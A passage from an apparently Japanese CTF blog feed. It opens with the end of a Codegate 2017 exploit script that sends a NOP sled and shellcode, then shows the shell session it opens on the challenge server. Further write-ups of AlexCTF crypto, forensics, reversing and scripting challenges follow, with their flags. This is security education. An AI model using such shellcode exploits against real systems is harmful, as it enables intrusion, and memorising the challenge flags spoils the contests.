<span id="cb12-101"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-101" aria-hidden="true" tabindex="-1"></a><span class="co"># send shellcode</span></span>
<span id="cb12-102"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-102" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">''</span></span>
<span id="cb12-103"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-103" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> <span class="bn">0x100</span></span>
<span id="cb12-104"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-104" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> shellcode</span>
<span id="cb12-105"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-105" aria-hidden="true" tabindex="-1"></a>change_message(<span class="dv">0</span>, <span class="bu">len</span>(payload), payload)</span>
<span id="cb12-106"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-106" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-107"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-107" aria-hidden="true" tabindex="-1"></a><span class="co"># select undefined action to call exit()</span></span>
<span id="cb12-108"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-108" aria-hidden="true" tabindex="-1"></a>choose_action(<span class="st">'Z'</span>)</span>
<span id="cb12-109"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-109" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-110"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-110" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
<pre><code>$ ./exploit.py
[+] Opening connection to 110.10.212.137 on port 3333: Done
[*] Switching to interactive mode
$ ls
flag
messenger
$ cat flag
1_wan3_y0ur_m3ssenger$%
$ 
[*] Closed connection to 110.10.212.137 port 3333</code></pre>
<h2 id="おわり">おわり</h2>
<p>解くのは楽しかったけど, 過去問に似た正答者数の多く得点がどんどん下がっていった問題しか解けてないので厳しい…</p>
<h3 id="参考url">参考URL</h3>
<ul>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet | pentestmonkey</a></li>
<li><a href="https://speakerdeck.com/bata_24/katagaitai-ctf-number-1">katagaitai CTF勉強会 #1 pwnables編 - DEFCON CTF 2014 pwn1 heap / katagaitai CTF #1 // Speaker Deck</a></li>
</ul>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><code>stdin</code>, <code>stdout</code> などがプログラムが動いているサーバ側を向いているため.<a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>AlexCTF writeup</title>
    <link href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/index.html" />
    <id>https://blog.myon.info/entry/2017/02/06/alexctf-writeup/index.html</id>
    <published>2017-02-06T11:16:00Z</published>
    <updated>2017-02-06T11:16:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://ctf.oddcoder.com/">AlexCTF</a> にも一人チーム <a href="https://ctf.oddcoder.com/team/568">poepoe</a> でこっそり参加. 590 points で 385 位でした.</p>
<!--more-->
<h2 id="cryptography">Cryptography</h2>
<h3 id="cr1-ultracoded-50pt">CR1: Ultracoded <small>(50pt)</small></h3>
<p>こんな感じのテキストファイルが与えられる.</p>
<pre><code>$ cat zero_one
code></pre>
<p><code>01</code> になおして ascii にすると Base64 ぽいのが出てきて, それを decode すると <code>.</code> と <code>-</code> の羅列が出てきた.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb2-1"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;bitset&gt;</span></span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fstream&gt;</span></span>
<span id="cb2-3"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;iostream&gt;</span></span>
<span id="cb2-4"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;boost/algorithm/string.hpp&gt;</span></span>
<span id="cb2-5"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-6"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="kw">auto</span> main<span class="op">()</span> <span class="op">-&gt;</span> <span class="dt">int</span> <span class="op">{</span></span>
<span id="cb2-7"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-7" aria-hidden="true" tabindex="-1"></a>  <span class="kw">auto</span> str <span class="op">=</span> <span class="op">[]</span> <span class="op">{</span></span>
<span id="cb2-8"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>ifstream<span class="op"> </span>ifs<span class="op">(</span><span class="st">&quot;./zero_one&quot;</span><span class="op">);</span></span>
<span id="cb2-9"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">std::</span>string<span class="op">{</span><span class="bu">std::</span>istreambuf_iterator<span class="op">&lt;</span><span class="dt">char</span><span class="op">&gt;(</span>ifs<span class="op">),</span> <span class="bu">std::</span>istreambuf_iterator<span class="op">&lt;</span><span class="dt">char</span><span class="op">&gt;()};</span></span>
<span id="cb2-10"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">}();</span></span>
<span id="cb2-11"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-12"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>algorithm<span class="ex">::</span>replace_all<span class="op">(</span>str<span class="op">,</span> <span class="st">&quot;ZERO&quot;</span><span class="op">,</span> <span class="st">&quot;0&quot;</span><span class="op">);</span></span>
<span id="cb2-13"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>algorithm<span class="ex">::</span>replace_all<span class="op">(</span>str<span class="op">,</span> <span class="st">&quot;ONE&quot;</span><span class="op">,</span> <span class="st">&quot;1&quot;</span><span class="op">);</span></span>
<span id="cb2-14"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-14" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>algorithm<span class="ex">::</span>erase_all<span class="op">(</span>str<span class="op">,</span> <span class="st">&quot; &quot;</span><span class="op">);</span></span>
<span id="cb2-15"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-15" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>algorithm<span class="ex">::</span>erase_all<span class="op">(</span>str<span class="op">,</span> <span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb2-16"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-17"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="kw">auto</span> i <span class="op">=</span> <span class="dv">0</span><span class="bu">u</span><span class="op">;</span> i <span class="op">&lt;</span> str<span class="op">.</span>size<span class="op">();</span> i <span class="op">+=</span> <span class="dv">8</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-18"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-18" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>bitset<span class="op">&lt;</span><span class="dv">8</span><span class="op">&gt;</span> b<span class="op">(</span>str<span class="op">,</span> i<span class="op">,</span> <span class="dv">8</span><span class="op">);</span></span>
<span id="cb2-19"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-19" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>cout<span class="op"> &lt;&lt;</span> <span class="kw">static_cast</span><span class="op">&lt;</span><span class="dt">char</span><span class="op">&gt;(</span>b<span class="op">.</span>to_ulong<span class="op">());</span></span>
<span id="cb2-20"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-20" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb2-21"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<pre><code>$ clang++ -Wall -Wextra -pedantic -std=c++14 toascii.cc -o toascii

$ ./toascii 
Li0gLi0uLiAuIC0uLi0gLS4tLiAtIC4uLS4gLSAuLi4uIC4tLS0tIC4uLi4uIC0tLSAuLS0tLSAuLi4gLS0tIC4uLi4uIC4uLSAuLS0uIC4uLi0tIC4tLiAtLS0gLi4uLi4gLiAtLi0uIC4tLiAuLi4tLSAtIC0tLSAtIC0uLi0gLQ==

$ ./toascii | base64 -d
.- .-.. . -..- -.-. - ..-. - .... .---- ..... --- .---- ... --- ..... ..- .--. ...-- .-. --- ..... . -.-. .-. ...-- - --- - -..- -</code></pre>
<p><a href="http://morsecode.scphillips.com/translator.html">Morse Code Translator</a> に投げたらそれっぽいのが出てきたので, 少し修正したら通った.</p>
<pre><code>ALEXCTFTH15O1SO5UP3RO5ECR3TOTXT -&gt; ALEXCTF{TH15_1S_5UP3R_5ECR3T_TXT}</code></pre>
<h2 id="forensics">Forensics</h2>
<h3 id="fore1-hit-the-core-50pt">Fore1: Hit the core <small>(50pt)</small></h3>
<p>core dump ファイル? が与えられる.<br />
最初は gdb とか使えばいいのかなーと思ったけど, 実行ファイルは置かれてないのでうーん…</p>
<p>諦めて <code>strings</code> してみると, こんな文字列が見つかった.</p>
<pre><code>$ strings fore1.core
(...)
cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}
(...)</code></pre>
<p>4文字ずつ消していくと Flag が出てきた.</p>
<pre><code>ALEXCTF{K33P_7H3_g00D_w0rk_up}</code></pre>
<h3 id="fore3-usb-probing-150pt">Fore3: USB probing <small>(150pt)</small></h3>
<p>USB の通信を読んだっぽい pcap ファイルが与えられる.<br />
Wireshark で一番大きな Frame を見たら png 画像が入ってて, そこに Flag が書かれてた.</p>
<pre><code>ALEXCTF{SN1FF_TH3_FL4G_0V3R_U58}</code></pre>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<h3 id="re1-gifted-50pt">RE1: Gifted <small>(50pt)</small></h3>
<p>32bit の ELF.</p>
<pre><code>$ file gifted 
gifted: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=50f578e89c55c2bde7f6c02b9f083fe7656d9d4d, stripped</code></pre>
<p><code>scanf("%s", str)</code> で読んだ文字列を <code>strcmp(flag, str)</code> してるだけなので, 比較してる文字列を読むだけ.</p>
<pre><code>$ r2 -A gifted
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
 -- Of course r2 runs FreeBSD
[0x08048430]&gt; e asm.comments = false
[0x08048430]&gt; e asm.nbytes = 0
[0x08048430]&gt; pdf @ main
/ (fcn) main 146
|   main ();
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|           0x0804852b      lea ecx, dword [esp + local_4h]
|           0x0804852f      and esp, 0xfffffff0
|           0x08048532      push dword [ecx - 4]
|           0x08048535      push ebp
|           0x08048536      mov ebp, esp
|           0x08048538      push ecx
|           0x08048539      sub esp, 0x14
|           0x0804853c      sub esp, 0xc
|           0x0804853f      push str.Enter_the_flag: ; str.Enter_the_flag:
|           0x08048544      call sym.imp.printf
|           0x08048549      add esp, 0x10
|           0x0804854c      sub esp, 0xc
|           0x0804854f      push 0x3e8
|           0x08048554      call sym.imp.malloc
|           0x08048559      add esp, 0x10
|           0x0804855c      mov dword [ebp - local_ch], eax
|           0x0804855f      sub esp, 8
|           0x08048562      push dword [ebp - local_ch]
|           0x08048565      push 0x8048655
|           0x0804856a      call sym.imp.__isoc99_scanf
|           0x0804856f      add esp, 0x10
|           0x08048572      sub esp, 8
|           0x08048575      push dword [ebp - local_ch]
|           0x08048578      push str.AlexCTF_Y0u_h4v3_45t0n15h1ng_futur3_1n_r3v3r5ing_ ; str.AlexCTF_Y0u_h4v3_45t0n15h1ng_futur3_1n_r3v3r5ing_
|           0x0804857d      call sym.imp.strcmp
|           0x08048582      add esp, 0x10
|           0x08048585      test eax, eax
|       ,=&lt; 0x08048587      jne 0x80485a3
|       |   0x08048589      sub esp, 0xc
|       |   0x0804858c      push str.You_got_it_right_dude_ ; str.You_got_it_right_dude_
|       |   0x08048591      call sym.imp.puts
|       |   0x08048596      add esp, 0x10
|       |   0x08048599      sub esp, 0xc
|       |   0x0804859c      push 0
|       |   0x0804859e      call sym.imp.exit
|       `-&gt; 0x080485a3      sub esp, 0xc
|           0x080485a6      push str.Try_harder_ ; str.Try_harder_
|           0x080485ab      call sym.imp.puts
|           0x080485b0      add esp, 0x10
|           0x080485b3      sub esp, 0xc
|           0x080485b6      push 0
\           0x080485b8      call sym.imp.exit
[0x08048430]&gt; ps @ str.AlexCTF_Y0u_h4v3_45t0n15h1ng_futur3_1n_r3v3r5ing_
AlexCTF{Y0u_h4v3_45t0n15h1ng_futur3_1n_r3v3r5ing}</code></pre>
<h3 id="re2-c-is-awesome-100pt">RE2: C++ is awesome <small>(100pt)</small></h3>
<p>64bit の ELF. タイトルの通り C++ で書かれたっぽい.</p>
<pre><code>$ file re2 
re2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=08fba98083e7c1f7171fd17c82befdfe1dcbcc82, stripped</code></pre>
<p>調べていくと</p>
<ol type="1">
<li><code>argv[1]</code> を <code>std::string</code> にする</li>
<li><ol type="1">
<li>の文字列を何らかの規則で内部の文字列と比較</li>
</ol>
<ul>
<li>(文字数足りなくても) OK だったら <code>"You should have the flag by now"</code></li>
<li>NG だったら <code>"Better luck next time"</code></li>
</ul></li>
</ol>
<p>という感じだったので, <code>"You should have the flag by now"</code> になる入力を <code>/ALEXCTF{[A-Za-z0-9_]*}/</code> にマッチするまで増やしていけばok. 昔似たようなスクリプトを書いたのが残ってたのでそれを流用した.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb11-1"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-1" aria-hidden="true" tabindex="-1"></a>chars <span class="kw">=</span> <span class="vs">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_'</span></span>
<span id="cb11-2"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-3"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-3" aria-hidden="true" tabindex="-1"></a>c <span class="kw">=</span> <span class="dv">0</span></span>
<span id="cb11-4"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-4" aria-hidden="true" tabindex="-1"></a>i <span class="kw">=</span> <span class="dv">0</span></span>
<span id="cb11-5"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-5" aria-hidden="true" tabindex="-1"></a>flag <span class="kw">=</span> chars<span class="kw">[</span>c<span class="kw">]</span></span>
<span id="cb11-6"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-7"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-7" aria-hidden="true" tabindex="-1"></a>while <span class="dv">true</span> <span class="cf">do</span></span>
<span id="cb11-8"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-8" aria-hidden="true" tabindex="-1"></a>  <span class="fu">print</span> <span class="st">&quot;[*] '</span><span class="sc">#{</span>flag<span class="sc">}</span><span class="st">' - &quot;</span></span>
<span id="cb11-9"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-10"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-10" aria-hidden="true" tabindex="-1"></a>  <span class="cf">case</span> <span class="in">`./re2 </span><span class="sc">#{</span>flag<span class="sc">}</span><span class="in">`</span></span>
<span id="cb11-11"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">when</span> <span class="ss">/Better luck next time/</span> <span class="cf">then</span></span>
<span id="cb11-12"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-12" aria-hidden="true" tabindex="-1"></a>    <span class="fu">puts</span> <span class="vs">'failed'</span></span>
<span id="cb11-13"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-13" aria-hidden="true" tabindex="-1"></a>    c <span class="kw">=</span> c<span class="at">.next</span></span>
<span id="cb11-14"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-14" aria-hidden="true" tabindex="-1"></a>    flag<span class="kw">[</span>i<span class="kw">]</span> <span class="kw">=</span> chars<span class="kw">[</span>c<span class="kw">]</span></span>
<span id="cb11-15"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-15" aria-hidden="true" tabindex="-1"></a>  <span class="cf">when</span> <span class="ss">/You should have the flag by now/</span> <span class="cf">then</span></span>
<span id="cb11-16"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="ss">/ALEXCTF{[A-Za-z0-9_]*}/</span> <span class="kw">=~</span> flag <span class="cf">then</span></span>
<span id="cb11-17"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-17" aria-hidden="true" tabindex="-1"></a>      <span class="fu">puts</span> <span class="vs">'done!'</span></span>
<span id="cb11-18"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-18" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span></span>
<span id="cb11-19"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span></span>
<span id="cb11-20"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-20" aria-hidden="true" tabindex="-1"></a>      <span class="fu">puts</span> <span class="vs">'failed'</span></span>
<span id="cb11-21"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-21" aria-hidden="true" tabindex="-1"></a>      c <span class="kw">=</span> <span class="dv">0</span></span>
<span id="cb11-22"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-22" aria-hidden="true" tabindex="-1"></a>      i <span class="kw">=</span> i<span class="at">.next</span></span>
<span id="cb11-23"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-23" aria-hidden="true" tabindex="-1"></a>      flag <span class="kw">&lt;&lt;</span> chars<span class="kw">[</span>c<span class="kw">]</span></span>
<span id="cb11-24"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">end</span></span>
<span id="cb11-25"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-25" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
<span id="cb11-26"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb11-26" aria-hidden="true" tabindex="-1"></a><span class="cf">end</span></span></code></pre></div>
<pre><code>$ ruby solve.rb
[*] '0' - failed
[*] '1' - failed
[*] '2' - failed
(...)
[*] 'ALEXCTF{W3_L0v3_C_W1th_CL45535z' - failed
[*] 'ALEXCTF{W3_L0v3_C_W1th_CL45535{' - failed
[*] 'ALEXCTF{W3_L0v3_C_W1th_CL45535}' - done!</code></pre>
<p>“内部で比較に使っている文字列” ってのもちゃんと Leet になってておもしろかった.</p>
<pre><code>$ r2 -A re2
(...)
[0x00400a60]&gt; pd 3 @ 0x00400c57
          0x00400c57      movzx edx, byte [rax]
          0x00400c5a      mov rcx, qword [str.L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A__FL4G__W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t]
          0x00400c61      mov eax, dword [rbp - local_14h]</code></pre>
<h2 id="scripting">Scripting</h2>
<h3 id="sc1-math-bot-100pt">SC1: Math bot <small>(100pt)</small></h3>
<p>指定されたサーバにつなぐと, ランダムな2数の和差積商剰余を求める問題が出題される. 桁は多いし500問もあるし, そしてたぶん時間制限もあるので自動化したいねというやつ.<br />
そういえばセキュキャンでやった CTF に似たのがあった気がする. (他のメンバーにお願いしたので解いてないけど)</p>
<p>こういった数式の処理は得意そうだし, 大きな数も <code>Integer</code> 使えば問題なさそうなので Haskell で書いた. やっぱり Pattern matching 強い.</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb14-1"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">module</span> <span class="dt">Main</span> <span class="kw">where</span></span>
<span id="cb14-2"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-3"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Network.Socket</span></span>
<span id="cb14-4"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">System.IO</span></span>
<span id="cb14-5"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-6"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ot">calcStr ::</span> (<span class="dt">Read</span> a) <span class="ot">=&gt;</span> (a <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> a) <span class="ot">-&gt;</span> <span class="dt">String</span> <span class="ot">-&gt;</span> <span class="dt">String</span> <span class="ot">-&gt;</span> a</span>
<span id="cb14-7"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-7" aria-hidden="true" tabindex="-1"></a>calcStr f x y <span class="ot">=</span> f (<span class="fu">read</span> x) (<span class="fu">read</span> y)</span>
<span id="cb14-8"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-9"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="ot">calc ::</span> [<span class="dt">String</span>] <span class="ot">-&gt;</span> <span class="dt">Maybe</span> <span class="dt">Integer</span></span>
<span id="cb14-10"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-10" aria-hidden="true" tabindex="-1"></a>calc (x<span class="op">:</span><span class="st">&quot;+&quot;</span><span class="op">:</span>y<span class="op">:</span><span class="st">&quot;=&quot;</span><span class="op">:</span>[]) <span class="ot">=</span> <span class="dt">Just</span> <span class="op">$</span> calcStr (<span class="op">+</span>)  x y</span>
<span id="cb14-11"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-11" aria-hidden="true" tabindex="-1"></a>calc (x<span class="op">:</span><span class="st">&quot;-&quot;</span><span class="op">:</span>y<span class="op">:</span><span class="st">&quot;=&quot;</span><span class="op">:</span>[]) <span class="ot">=</span> <span class="dt">Just</span> <span class="op">$</span> calcStr (<span class="op">-</span>)  x y</span>
<span id="cb14-12"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-12" aria-hidden="true" tabindex="-1"></a>calc (x<span class="op">:</span><span class="st">&quot;*&quot;</span><span class="op">:</span>y<span class="op">:</span><span class="st">&quot;=&quot;</span><span class="op">:</span>[]) <span class="ot">=</span> <span class="dt">Just</span> <span class="op">$</span> calcStr (<span class="op">*</span>)  x y</span>
<span id="cb14-13"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-13" aria-hidden="true" tabindex="-1"></a>calc (x<span class="op">:</span><span class="st">&quot;/&quot;</span><span class="op">:</span>y<span class="op">:</span><span class="st">&quot;=&quot;</span><span class="op">:</span>[]) <span class="ot">=</span> <span class="dt">Just</span> <span class="op">$</span> calcStr <span class="fu">quot</span> x y</span>
<span id="cb14-14"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-14" aria-hidden="true" tabindex="-1"></a>calc (x<span class="op">:</span><span class="st">&quot;%&quot;</span><span class="op">:</span>y<span class="op">:</span><span class="st">&quot;=&quot;</span><span class="op">:</span>[]) <span class="ot">=</span> <span class="dt">Just</span> <span class="op">$</span> calcStr <span class="fu">mod</span>  x y</span>
<span id="cb14-15"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-15" aria-hidden="true" tabindex="-1"></a>calc _                <span class="ot">=</span> <span class="dt">Nothing</span></span>
<span id="cb14-16"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-17"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-17" aria-hidden="true" tabindex="-1"></a><span class="ot">solver ::</span> <span class="dt">Handle</span> <span class="ot">-&gt;</span> <span class="dt">IO</span> ()</span>
<span id="cb14-18"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-18" aria-hidden="true" tabindex="-1"></a>solver h <span class="ot">=</span> hGetContents h <span class="op">&gt;&gt;=</span> <span class="fu">mapM_</span> solver' <span class="op">.</span> <span class="fu">lines</span></span>
<span id="cb14-19"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-19" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span> solver' l <span class="ot">=</span> <span class="fu">putStrLn</span> l <span class="op">&gt;&gt;</span></span>
<span id="cb14-20"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-20" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">case</span> calc <span class="op">$</span> <span class="fu">words</span> l <span class="kw">of</span></span>
<span id="cb14-21"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-21" aria-hidden="true" tabindex="-1"></a>                         <span class="dt">Just</span> x  <span class="ot">-&gt;</span> <span class="fu">print</span> x <span class="op">&gt;&gt;</span> hPrint h x</span>
<span id="cb14-22"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-22" aria-hidden="true" tabindex="-1"></a>                         <span class="dt">Nothing</span> <span class="ot">-&gt;</span> <span class="fu">return</span> ()</span>
<span id="cb14-23"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-24"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-24" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb14-25"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-25" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> withSocketsDo <span class="op">$</span> <span class="kw">do</span></span>
